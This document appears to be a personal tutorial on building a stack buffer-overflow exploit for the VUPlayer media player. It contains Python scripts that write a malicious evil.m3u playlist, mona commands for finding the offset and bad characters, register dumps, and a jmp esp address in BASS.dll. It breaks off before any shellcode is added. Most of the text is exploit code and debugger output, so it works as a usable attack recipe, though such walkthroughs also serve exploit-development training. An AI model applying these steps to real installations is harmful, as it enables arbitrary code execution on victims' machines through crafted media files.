# VUPlayer Buffer OverFlow
---
## Step by step guide
### Sofware:

- Immunity debugger
- mona
- VUPlayer
- Windows 10 pro
- Notepad ++
- Kali linux
- VMVirtualbox

---
Open python script <filename>
```python
#!/usr/bin/python
import subprocess
import os

print("vuplayer_exploit v1.0 by Dreg\n")
print("*****************************\n")

#shellcode_bind_shellfer = '\x41' * 1500 # padding
#shellcode_bind_shellfer += '\x42\x42\x42\x42' # ret addr
#shellcode_bind_shellfer +=''

print("\nfile content (size " + str(len(shellcode_bind_shellfer))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

f = open('evil.m3u', 'wb')

f.write(shellcode_bind_shellfer)

f.close()
```
---
generate \x41 pattern
```python
shellcode_bind_shellfer = '\x41' * 1500 # padding
```

A 1500 \x41 pattern will be created after run the script in windows terminal

Open immunity debugger and run VUPlayer.exe run with F9
Open VUPlayer and add evil.m3u to playlist

the pattern of \ x41 exceeds the buffer limit.
Create a folder for logs in c:
```python
!mona config -set workingfolder c:\logs\%p
```
Create a pattern in immunity with the next command:
```python
!mona pattern_create 1500
```
Cpy pattern from logs
```sh
================================================================================
  Output generated by mona.py v2.0, rev 613 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : 10, release 10.0.19041
  Process being debugged : VUPlayer (pid 7688)
  Current mona arguments: pattern_create 1500
================================================================================
  2021-01-14 23:27:54
================================================================================

Pattern of 1500 bytes :
-----------------------

ASCII:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
```
Copy pattern to a empty .txt file and rename as evil.m3u
on immunity press control+F2 and F9, and open evil.m3u file in immunity

Log data, item 8
 Address=0BADF00D
 Message= - Pattern h7Bh (0x68423768) found in cyclic pattern at position 1012

```python
#!/usr/bin/python
import subprocess
import os

print("vuplayer_exploit v1.0 by Dreg\n")
print("*****************************\n")

shellcode_bind_shellfer = '\x41' * 1012 # padding
shellcode_bind_shellfer += '\x42\x42\x42\x42' # ret addr

print("\nfile content (size " + str(len(shellcode_bind_shellfer))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

f = open('evil.m3u', 'wb')

f.write(shellcode_bind_shellfer)

f.close()
```
Run the script and see if the EBP register is filled with "BBBBBBBB" 41414141
```sh
EAX 00000000
ECX 41414141
EDX 00000000
EBX 00000001
ESP 0019E714 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
EBP 41414141
ESI 00000000
EDI 0019EA80
EIP 41414141
C 0  ES 002B 32bit 0(FFFFFFFF)
P 1  CS 0023 32bit 0(FFFFFFFF)
A 0  SS 002B 32bit 0(FFFFFFFF)
Z 1  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 306000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr ERROR_PATH_NOT_FOUND (00000003)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
               3 2 1 0      E S P U O Z D I
FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
```
## Finding the BadChars

Create a byte array with mona, and add it to the script... and run it!

```python
!mona bytearray -cpb "\x00"
```
```python
#!/usr/bin/python
import subprocess
import os

print("vuplayer_exploit v1.0 by Dreg\n")
print("*****************************\n")

shellcode_bind_shellfer = '\x41' * 1500 # padding
shellcode_bind_shellfer += '\x42\x42\x42\x42' # ret add
shellcode_bind_shellfer += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
shellcode_bind_shellfer += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
shellcode_bind_shellfer += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
shellcode_bind_shellfer += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
shellcode_bind_shellfer += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
shellcode_bind_shellfer += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
shellcode_bind_shellfer += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
shellcode_bind_shellfer += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


print("\nfile content (size " + str(len(shellcode_bind_shellfer))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

f = open('evil.m3u', 'wb')

f.write(shellcode_bind_shellfer)

f.close()
```
```python
!mona compare -f C:\logs\VUPlayer\bytearray.bin -a 0019e714
```
mona Memory comparison results 
|Address                  |Status                    |BadChars                  |Type                      |Location    |
| ----------------------- | ------------------------ | ------------------------ | ------------------------ | ---------- |
| 0x0019e714              |  Corruption after 0 bytes|   00 09                  |   normal                 |   Stack    |

remove the badchars from the pattern and repeat the procces again...
```python
!mona bytearray -cpb "\x00\x01"
!mona compare -f C:\logs\VUPlayer\bytearray.bin -a 0019e714
```
mona Memory comparison results 
|Address                  |Status                    |BadChars                  |Type                      |Location    |
| ----------------------- | ------------------------ | ------------------------ | ------------------------ | ---------- |
| 0x0019e714              |  Corruption after 0 bytes|   00 09 0a 1a            |   normal                 |   Stack    |

```python
!mona bytearray -cpb "\x00\x09\x0a\1a"
!mona compare -f C:\logs\VUPlayer\bytearray.bin -a 0019e714
```
Hurray!
---
## The return address
ASLR no please!

```python
!mona jmp -r esp
```
find a jmp address without 00
```sh
Log data, item 11
 Address=1002A659
 Message=  0x1002a659 : jmp esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
```